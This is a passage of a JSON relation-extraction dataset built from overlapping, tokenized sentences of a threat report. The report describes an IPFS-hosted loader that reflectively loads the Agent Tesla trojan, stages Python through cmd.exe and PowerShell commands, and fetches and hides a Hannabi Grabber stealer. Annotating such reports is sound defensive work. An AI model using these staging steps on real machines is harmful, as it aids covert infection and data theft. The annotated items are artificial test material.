[4], "t": 13, "h": 14}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "ST", "evidence": [4], "h": 14, "t": 16}, {"r": "RF", "evidence": [4], "h": 14, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 17}, {"r": "WR", "evidence": [4, 5], "t": 15, "h": 17}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 20, "t": 21}, {"r": "ST", "evidence": [6], "h": 20, "t": 22}, {"r": "RF", "evidence": [6], "h": 20, "t": 22}]}, {"title": "608-17", "sents": [["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."], ["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."], ["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."], ["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."], ["4-embed-amd64.zipOnce", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "data", "pos": [4, 5], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [7, 7], "name": "IPFS gateway", "pos": [7, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "It", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "executable", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "PE32", "pos": [18, 19], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "This", "pos": [0, 1], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "remote access trojan", "pos": [23, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "RAT", "pos": [27, 28], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "Agent Tesla", "pos": [30, 32], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [77, 77], "name": "payload", "pos": [7, 8], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "loader", "pos": [11, 12], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": "payload", "pos": [20, 21], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [94, 94], "name": "IPFS network", "pos": [24, 26], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [107, 107], "name": "loader", "pos": [5, 6], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "loader", "pos": [4, 5], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [132, 132], "name": "% APPDATA %", "pos": [11, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [153, 153], "name": "malware", "pos": [32, 33], "index": "17_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [158, 158], "name": "Python 3.10", "pos": [37, 39], "index": "18_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [163, 163], "name": "software provider", "pos": [42, 44], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [185, 185], "name": "ZIP archive", "pos": [2, 4], "index": "20_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [191, 191], "name": "it", "pos": [8, 9], "index": "21_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 9}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 8}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2, 3], "t": 4, "h": 11}, {"r": "EX", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "ST", "evidence": [3], "h": 11, "t": 13}, {"r": "RF", "evidence": [3], "h": 11, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 14}, {"r": "WR", "evidence": [3, 4], "t": 12, "h": 14}, {"r": "ST", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "RF", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "ST", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "RF", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "RD", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "ST", "evidence": [5], "h": 17, "t": 19}, {"r": "RF", "evidence": [5], "h": 17, "t": 19}, {"r": "WR", "evidence": [5, 6, 7], "h": 17, "t": 20}, {"r": "RD", "evidence": [5, 6, 7], "h": 17, "t": 20}, {"r": "CO", "evidence": [5, 6, 7], "h": 18, "t": 20}, {"r": "CO", "evidence": [5, 6, 7], "h": 18, "t": 21}]}, {"title": "608-18", "sents": [["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."], ["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."], ["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."], ["4-embed-amd64.zipOnce", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "executable", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "PE32", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "This", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "remote access trojan", "pos": [23, 26], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "RAT", "pos": [27, 28], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [50, 50], "name": "Agent Tesla", "pos": [30, 32], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "payload", "pos": [7, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "loader", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "payload", "pos": [20, 21], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [77, 77], "name": "IPFS network", "pos": [24, 26], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "loader", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "loader", "pos": [4, 5], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [115, 115], "name": "% APPDATA %", "pos": [11, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [136, 136], "name": "malware", "pos": [32, 33], "index": "14_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [141, 141], "name": "Python 3.10", "pos": [37, 39], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [146, 146], "name": "software provider", "pos": [42, 44], "index": "16_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [168, 168], "name": "ZIP archive", "pos": [2, 4], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [174, 174], "name": "it", "pos": [8, 9], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 8}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "ST", "evidence": [2], "h": 8, "t": 10}, {"r": "RF", "evidence": [2], "h": 8, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 11}, {"r": "ST", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RF", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "ST", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RF", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RD", "evidence": [3, 4], "h": 11, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "ST", "evidence": [4], "h": 14, "t": 16}, {"r": "RF", "evidence": [4], "h": 14, "t": 16}, {"r": "WR", "evidence": [4, 5, 6], "h": 14, "t": 17}, {"r": "RD", "evidence": [4, 5, 6], "h": 14, "t": 17}, {"r": "CO", "evidence": [4, 5, 6], "h": 15, "t": 17}, {"r": "CO", "evidence": [4, 5, 6], "h": 15, "t": 18}]}, {"title": "608-19", "sents": [["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."], ["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."], ["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."], ["4-embed-amd64.zipOnce", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"], ["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "This", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [23, 23], "name": "remote access trojan", "pos": [23, 26], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [27, 27], "name": "RAT", "pos": [27, 28], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [30, 30], "name": "Agent Tesla", "pos": [30, 32], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": "payload", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "loader", "pos": [11, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "payload", "pos": [20, 21], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [57, 57], "name": "IPFS network", "pos": [24, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "loader", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "loader", "pos": [4, 5], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [95, 95], "name": "% APPDATA %", "pos": [11, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [116, 116], "name": "malware", "pos": [32, 33], "index": "11_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [121, 121], "name": "Python 3.10", "pos": [37, 39], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [126, 126], "name": "software provider", "pos": [42, 44], "index": "13_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [148, 148], "name": "ZIP archive", "pos": [2, 4], "index": "14_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [154, 154], "name": "it", "pos": [8, 9], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [193, 193], "name": "malware", "pos": [6, 7], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "payload", "pos": [13, 14], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [207, 207], "name": "it", "pos": [20, 21], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [216, 216], "name": "Packages.txt", "pos": [29, 30], "index": "19_0"}]], "labels": [{"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 7}, {"r": "RF", "evidence": [1], "h": 5, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 8}, {"r": "ST", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "RF", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "ST", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "RF", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "RD", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "ST", "evidence": [3], "h": 11, "t": 13}, {"r": "RF", "evidence": [3], "h": 11, "t": 13}, {"r": "WR", "evidence": [3, 4, 5], "h": 11, "t": 14}, {"r": "RD", "evidence": [3, 4, 5], "h": 11, "t": 14}, {"r": "CO", "evidence": [3, 4, 5], "h": 12, "t": 14}, {"r": "CO", "evidence": [3, 4, 5], "h": 12, "t": 15}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 11, "t": 16}, {"r": "RD", "evidence": [7], "h": 16, "t": 17}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}, {"r": "CO", "evidence": [7], "h": 17, "t": 19}, {"r": "CO", "evidence": [7], "h": 17, "t": 18}]}, {"title": "608-20", "sents": [["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."], ["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."], ["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."], ["4-embed-amd64.zipOnce", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"], ["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "payload", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "loader", "pos": [11, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "payload", "pos": [20, 21], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [24, 24], "name": "IPFS network", "pos": [24, 26], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "loader", "pos": [5, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "loader", "pos": [4, 5], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [62, 62], "name": "% APPDATA %", "pos": [11, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [83, 83], "name": "malware", "pos": [32, 33], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [88, 88], "name": "Python 3.10", "pos": [37, 39], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [93, 93], "name": "software provider", "pos": [42, 44], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [115, 115], "name": "ZIP archive", "pos": [2, 4], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [121, 121], "name": "it", "pos": [8, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 160], "name": "malware", "pos": [6, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "payload", "pos": [13, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [174, 174], "name": "it", "pos": [20, 21], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [183, 183], "name": "Packages.txt", "pos": [29, 30], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "loader", "pos": [4, 5], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "Hannabi Grabber", "pos": [6, 8], "index": "17_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 3}, {"r": "RF", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "ST", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "ST", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RD", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "ST", "evidence": [2], "h": 7, "t": 9}, {"r": "RF", "evidence": [2], "h": 7, "t": 9}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 10}, {"r": "RD", "evidence": [2, 3, 4], "h": 7, "t": 10}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 10}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 11}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 7, "t": 12}, {"r": "RD", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6], "h": 13, "t": 15}, {"r": "CO", "evidence": [6], "h": 13, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 12, "t": 16}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}]}, {"title": "608-21", "sents": [["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."], ["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."], ["4-embed-amd64.zipOnce", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"], ["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "loader", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "loader", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [30, 30], "name": "% APPDATA %", "pos": [11, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "malware", "pos": [32, 33], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [56, 56], "name": "Python 3.10", "pos": [37, 39], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [61, 61], "name": "software provider", "pos": [42, 44], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [83, 83], "name": "ZIP archive", "pos": [2, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [89, 89], "name": "it", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "malware", "pos": [6, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [135, 135], "name": "payload", "pos": [13, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "it", "pos": [20, 21], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [151, 151], "name": "Packages.txt", "pos": [29, 30], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [158, 158], "name": "loader", "pos": [4, 5], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [160, 160], "name": "Hannabi Grabber", "pos": [6, 8], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [174, 174], "name": "loader", "pos": [1, 2], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [178, 178], "name": "attrib.exe", "pos": [5, 6], "index": "15_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [196, 196], "name": "Python ZIP archive", "pos": [23, 26], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [201, 201], "name": "payload", "pos": [28, 29], "index": "17_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 8}, {"r": "RD", "evidence": [5], "h": 8, "t": 9}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "CO", "evidence": [5], "h": 9, "t": 11}, {"r": "CO", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [5, 6], "h": 8, "t": 12}, {"r": "CO", "evidence": [5, 6, 7], "h": 8, "t": 14}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "FR", "evidence": [7], "h": 14, "t": 15}, {"r": "CD", "evidence": [7], "h": 15, "t": 16}, {"r": "CD", "evidence": [7], "h": 15, "t": 17}]}, {"title": "608-22", "sents": [["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."], ["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."], ["4-embed-amd64.zipOnce", "the", "ZIP", "archive", 